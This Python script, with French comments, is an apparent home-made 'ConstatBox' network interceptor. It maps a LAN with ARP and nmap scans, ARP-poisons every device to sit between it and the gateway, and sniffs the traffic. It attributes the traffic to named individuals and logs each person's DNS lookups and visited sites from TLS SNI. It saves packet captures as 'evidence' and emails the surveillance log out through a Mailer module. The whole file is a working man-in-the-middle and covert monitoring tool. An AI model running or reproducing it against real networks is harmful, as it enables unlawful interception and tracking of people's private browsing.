#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Mon Feb  2 16:14:17 2026

@author: benbruno
"""
import json
import os
import subprocess
import time
from datetime import datetime
import netifaces
import nmap
from scapy.all import ARP, Ether, srp, conf, send, wrpcap, IP, DNS, DNSQR, AsyncSniffer
from IdentityManager import IdentityManager
from scapy.layers.tls.all import TLS
from Mailer import send_investigation_log

# --- MODULE DE ROBUSTESSE TLS ---
try:
    from scapy.layers.tls.all import TLS, TLS_Ext_ServerName
    HAS_TLS_SUPPORT = True
except ImportError:
    HAS_TLS_SUPPORT = False
    print("[!] Attention : La bibliothèque 'cryptography' manque. L'analyse des sites Web sera limitée.")

def get_human_friendly_site(pkt):
    """
    Tente d'extraire le nom du site web (SNI) de manière sécurisée.
    """
    if not HAS_TLS_SUPPORT:
        return None
        
    try:
        # On cible le Handshake TLS qui contient le nom du site en clair
        if pkt.haslayer(TLS) and hasattr(pkt[TLS], 'msg'):
            for msg in pkt[TLS].msg:
                if hasattr(msg, 'ext'):
                    for ext in msg.ext:
                        # Recherche spécifique de l'extension ServerName
                        if isinstance(ext, TLS_Ext_ServerName):
                            server_name = ext.servernames[0].hostname.decode('utf-8')
                            return server_name
    except Exception:
        # En cas de paquet complexe ou malformé, on ne plante pas le script
        return None
    return None


identity_engine = IdentityManager()
def get_sni_name(pkt):
    """Extrait le nom du site web d'une connexion chiffrée (SNI)"""
    try:
        if pkt.haslayer(TLS) and pkt.getlayer(TLS).type == 22: # Handshake
            # On cherche l'extension ServerName
            # Note: Nécessite scapy[tls] installé
            return pkt[TLS].msg[0].ext[0].servernames[0].hostname.decode()
    except:
        return None
    return None

# --- CONFIGURATION ---
DURATION_SNIFF = 60
WHITELIST = ["8.8.8.8", "1.1.1.1"] 
ARCHIVE_DIR = "archives"

if not os.path.exists(ARCHIVE_DIR):
    os.makedirs(ARCHIVE_DIR)

# --- STATISTIQUES GLOBALES ---
stats = {"dns_queries": 0, "external_alerts": 0, "total_packets": 0}

# --- FONCTIONS D'IDENTIFICATION ---

def get_vendor_and_type(mac, vendor_from_nmap=None):
    vendor = vendor_from_nmap if vendor_from_nmap else conf.manufdb._get_manuf(mac)
    mac_lower = mac.lower()
    is_private = mac_lower[1] in ['2', '6', 'a', 'e']
    final_vendor = vendor if vendor else ("Private MAC" if is_private else "Unknown")
    vendor_low = final_vendor.lower()
    
    device_type = "Station/Workstation"
    if is_private: device_type = "Mobile (Privacy Mode)"
    elif any(x in vendor_low for x in ["apple", "samsung", "google", "huawei"]): device_type = "Mobile/Tablet"
    elif any(x in vendor_low for x in ["cisco", "tp-link", "netgear", "d-link", "sagemcom", "technicolor"]): device_type = "Infrastructure"
    elif any(x in vendor_low for x in ["raspberry", "espressif", "arduino"]): device_type = "IoT/Embedded"
    
    return final_vendor, device_type

# --- FONCTIONS DE RÉSEAU (PHASE 1) ---

def scan_host_ports(ip):
    nm = nmap.PortScanner()
    try:
        nm.scan(ip, arguments='-F -sV --connect-timeout 2')
        if ip not in nm.all_hosts(): return [], "Unknown"
        ports_data = []
        hostname = nm[ip].hostname()
        for proto in nm[ip].all_protocols():
            for port in nm[ip][proto].keys():
                if nm[ip][proto][port]['state'] == 'open':
                    ports_data.append({
                        "port": port, "service": nm[ip][proto][port]['name'], "version": nm[ip][proto][port]['product']
                    })
        return ports_data, hostname
    except: return [], "Unknown"

def get_available_wifi():
    networks_dict = {}
    try:
        cmd = "nmcli -t -f SSID,SIGNAL,SECURITY dev wifi"
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL).decode('utf-8')
        for line in output.strip().split('\n'):
            if line:
                parts = line.split(':')
                ssid = parts[0]
                if not ssid: continue
                sig = int(parts[1].replace('%', ''))
                if ssid not in networks_dict or sig > int(networks_dict[ssid]['signal'].replace('%', '')):
                    networks_dict[ssid] = {"ssid": ssid, "signal": f"{sig}%", "security": parts[2]}
    except: pass
    return sorted(list(networks_dict.values()), key=lambda x: int(x['signal'].replace('%','')), reverse=True)

def get_local_info():
    gws = netifaces.gateways()
    iface = gws['default'][netifaces.AF_INET][1]
    gateway = gws['default'][netifaces.AF_INET][0]
    ip_info = netifaces.ifaddresses(iface)[netifaces.AF_INET][0]
    network = ".".join(ip_info['addr'].split('.')[:-1]) + ".0/16"
    return iface, network, gateway

def get_mac(ip, iface):
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, iface=iface, verbose=False)
    if ans: return ans[0][1].hwsrc
    return None


import socket
import requests

# Cache pour éviter de saturer l'API et le réseau
geo_cache = {}

def get_geo_info(ip):
    """Récupère le pays et le drapeau d'une IP externe."""
    if ip in geo_cache:
        return geo_cache[ip]
    
    # On ignore les plages locales et multicast
    if ip.startswith(("192.168.", "10.", "172.", "239.", "224.")):
        return ""

    try:
        # Requête à l'API (limite : 45 requêtes/min en gratuit)
        response = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,countryCode", timeout=1).json()
        if response.get("status") == "success":
            country = response.get("country")
            code = response.get("countryCode")
            # Transformation du code pays en drapeau Emoji
            flag = "".join(chr(127397 + ord(c)) for c in code)
            info = f" [{country} {flag}]"
            geo_cache[ip] = info
            return info
    except:
        pass
    return ""

def get_hostname_human(ip):
    """Transforme l'IP en nom de domaine lisible."""
    try:
        return socket.gethostbyaddr(ip)[0]
    except:
        return ip


# --- MODULE D'INTERCEPTION & ANALYSE (PHASE 2) ---

def analyze_packet(pkt):
    global stats
    stats["total_packets"] += 1
    if pkt.haslayer(IP):
        src_ip = pkt[IP].src
        dst_ip = pkt[IP].dst
        src_mac = pkt.src.upper()
        # Identification Humaine
        user_name = identity_engine.resolve_human_name(src_ip, src_mac, pkt)
        
       # ALERTE EXTERNE (Trafic sortant du réseau)
        if not dst_ip.startswith(("192.168.", "172.", "10.", "239.", "224.")):
            stats["external_alerts"] += 1
        
        # Résolution du nom du serveur (Google, Amazon, etc.)
            server_name = get_hostname_human(dst_ip)
            
            # Récupération du pays et du drapeau
            geo_info = get_geo_info(dst_ip)
            
            log_entry = f"[ALERTE] {user_name} → {server_name}{geo_info}"
            
            # Affichage superbe : [ALERTE] Utilisateur -> Serveur [Pays 🚩]
            print(f"    \033[91m[ALERTE]\033[0m {user_name} \033[94m→\033[0m {server_name}{geo_info}")

    
            # Sauvegarde Log (Texte brut horodaté)
            with open(current_log_path, "a", encoding="utf-8") as f:
                timestamp = datetime.now().strftime("%H:%M:%S")
                f.write(f"[{timestamp}] {log_entry}\n")
              
        # 3. DNS Analysis (Conserver pour voir les intentions de recherche)
        elif pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:
            stats["dns_queries"] += 1
            try:
                query = pkt.getlayer(DNSQR).qname.decode()
                if "connectivity-check" not in query: # On filtre le bruit système
                    log_dns = f"[RECHERCHE] {user_name} cherche : {query}"
                    print(f"    [🔍 RECHERCHE] {user_name} cherche : {query}")
                    with open(current_log_path, "a", encoding="utf-8") as f:
                        timestamp = datetime.now().strftime("%H:%M:%S")
                        f.write(f"[{timestamp}] {log_dns}\n")
            except: pass
        
        
        
        # Tentative d'extraction du nom du site
        site_name = get_human_friendly_site(pkt)

        if site_name:
            print(f"    [🌐 NAVIGATION] {user_name} est actuellement sur : {site_name}")
        
        # Conservation de l'analyse DNS classique
        elif pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:
            stats["dns_queries"] += 1
            try:
                query = pkt.getlayer(DNSQR).qname.decode()
                print(f"    [WEB-DNS] {user_name} cherche : {query}")
            except: pass
        
        # 1. DNS Analysis
        if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:
            stats["dns_queries"] += 1
            try:
                query = pkt.getlayer(DNSQR).qname.decode()
                print(f"    [WEB-DNS] {src_ip} -> {query}")
            except: pass
        # 2. Analyse HTTPS (Le "Qui va où" sans décrypter)
        sni = get_sni_name(pkt)
        if sni:
            print(f"    [🌐 NAVIGATION] {user_name} est sur : {sni}")
            
        # 3. External Alerts
        if not dst_ip.startswith("192.168.") and not dst_ip.startswith("172.") and dst_ip not in WHITELIST and not dst_ip.startswith("239."):
            stats["external_alerts"] += 1
            print(f"    [ALERTE EXTERNE] {src_ip} envoie des données vers {dst_ip}")

def spoof_all(devices, gateway_ip, iface):
    for d in devices:
        if not d['is_gateway']:
            send(ARP(op=2, pdst=d['ip'], hwdst=d['mac'], psrc=gateway_ip), iface=iface, verbose=False)
            send(ARP(op=2, pdst=gateway_ip, psrc=d['ip']), iface=iface, verbose=False)

def restore_all(devices, gateway_ip, gateway_mac, iface):
    print(f"\n[*] Nettoyage du réseau : Rétablissement des tables ARP...")
    for d in devices:
        if not d['is_gateway']:
            send(ARP(op=2, pdst=d['ip'], hwdst=d['mac'], psrc=gateway_ip, hwsrc=gateway_mac), count=2, iface=iface, verbose=False)

def run_tshark_live(iface, duration):
    cmd = [
        "tshark", "-i", iface, "-a", f"duration:{duration}",
        "-T", "fields", "-e", "_ws.col.Protocol", "-e", "ip.src", "-e", "ip.dst",
        "-Y", "not arp and not icmp"
    ]
    return subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)

# --- EXECUTION ---

def run_constat_global():
    iface, network, gateway = get_local_info()
    gateway_mac = get_mac(gateway, iface)
    now = datetime.now()
    ts_str = now.strftime("%Y%m%d_%H%M%S")

    # Création du nom du fichier de log horodaté
    log_filename = f"{ARCHIVE_DIR}/journal_surveillance.{ts_str}.log"
    
    # On ouvre le fichier en mode écriture
    with open(log_filename, "w", encoding="utf-8") as log_file:
        log_file.write(f"=== JOURNAL DE SURVEILLANCE CONSTATBOX ===\n")
        log_file.write(f"Session démarrée le : {now.strftime('%d/%m/%Y %H:%M:%S')}\n")
        log_file.write(f"Interface: {iface} | Gateway: {gateway}\n")
        log_file.write("="*50 + "\n\n")

    # On passe le nom du log à la fonction d'analyse pour qu'elle puisse écrire dedans
    # Note : On stocke le nom du log dans une variable globale pour analyze_packet
    global current_log_path
    current_log_path = log_filename
    
    
    print("="*95)
    print(f" 🛡️  CONSTATBOX v3.0 GLOBAL INTERCEPTOR | {now.strftime('%d/%m/%Y %H:%M:%S')}")
    print(f" Interface: {iface} | Gateway: {gateway} ({gateway_mac})")
    print("="*95)

    # PHASE 1 : SCAN
    print(f"[*] ÉTAPE 1 : Cartographie complète du réseau...")
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network), timeout=2, iface=iface, verbose=False)
    
    devices = []
    for sent, rcv in ans:
        print(f"    [+] Analyse de l'hôte {rcv.psrc}...")
        ports, hostname = scan_host_ports(rcv.psrc)
        vendor, dev_type = get_vendor_and_type(rcv.hwsrc)
        devices.append({
            "ip": rcv.psrc, "hostname": hostname, "mac": rcv.hwsrc.upper(),
            "vendor": vendor, "type": dev_type, "is_gateway": rcv.psrc == gateway, "open_ports": ports
        })

    # AFFICHAGE SYNTHÈSE SCAN
    print("\n" + "📑 DISPOSITIFS IDENTIFIÉS")
    print("─"*95)
    for d in devices:
        gw_label = " ⭐ [GATEWAY]" if d['is_gateway'] else ""
        print(f"{d['ip']:<15} | {d['mac']} | {d['type']:<20} | {d['vendor']}{gw_label}")
        if d['open_ports']:
            ports_str = ", ".join([str(p['port']) for p in d['open_ports']])
            print(f"               └─ Ports ouverts : {ports_str}")

    # PHASE 2 : INTERCEPTION
    print("\n" + "═"*95)
    print(f" 🔍 ÉTAPE 2 : INTERCEPTION GLOBALE ET SNIFFING ({DURATION_SNIFF}s)")
    print("═"*95)

    sniffer = AsyncSniffer(iface=iface, prn=analyze_packet, store=True)
    sniffer.start()
    tshark_proc = run_tshark_live(iface, DURATION_SNIFF)

    try:
        start_time = time.time()
        while time.time() - start_time < DURATION_SNIFF:
            spoof_all(devices, gateway, iface)
            # Affichage de la progression
            elapsed = int(time.time() - start_time)
            percent = int((elapsed / DURATION_SNIFF) * 100)
            bar = "█" * (percent // 2) + "-" * (50 - percent // 2)
            print(f"\r    PROGRESSION : |{bar}| {percent}% ({elapsed}/{DURATION_SNIFF}s)", end="")
            
            # Lecture d'une ligne TShark pour le live
            line = tshark_proc.stdout.readline()
            if line:
                print(f"\n    [LIVE] {line.strip()}")
            
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[!] Arrêt prématuré demandé.")

    packets = sniffer.stop()
    tshark_proc.terminate()
    restore_all(devices, gateway, gateway_mac, iface)

    # SAUVEGARDE & FORENSIC
    pcap_path = f"{ARCHIVE_DIR}/global_evidence_{ts_str}.pcap"
    wrpcap(pcap_path, packets)
    
    # --- AJOUT POUR LA SAUVEGARDE JSON ---
    wifi_list = get_available_wifi() # On récupère les réseaux Wi-Fi alentours
    report_data = {
        "timestamp": now.isoformat(),
        "network_info": {"interface": iface, "network": network, "gateway": gateway},
        "devices": devices, # La liste des IPs/MACs trouvées à l'étape 1
        "wifi": wifi_list,
        "stats": stats # Les compteurs de paquets et alertes
    }
    
    json_path = f"{ARCHIVE_DIR}/scan_{ts_str}.json"
    with open(json_path, "w") as f:
        json.dump(report_data, f, indent=4)
    
    print(f"   - Archive JSON : {json_path}")
    
    send_investigation_log(current_log_path) # current_log_path contient ton journal_surveillance.log
    
    print("\n" + "═"*95)
    print(f"📊 RAPPORT D'INTERCEPTION TERMINÉ")
    print(f"   - Paquets capturés : {stats['total_packets']}")
    print(f"   - Requêtes DNS identifiées : {stats['dns_queries']}")
    print(f"   - Communications suspectes : {stats['external_alerts']}")
    print(f"   - Fichier de preuve : {pcap_path}")
    print("═"*95)

if __name__ == "__main__":
    if os.getuid() != 0: print("[!] SUDO requis pour l'empoisonnement ARP.")
    else: run_constat_global()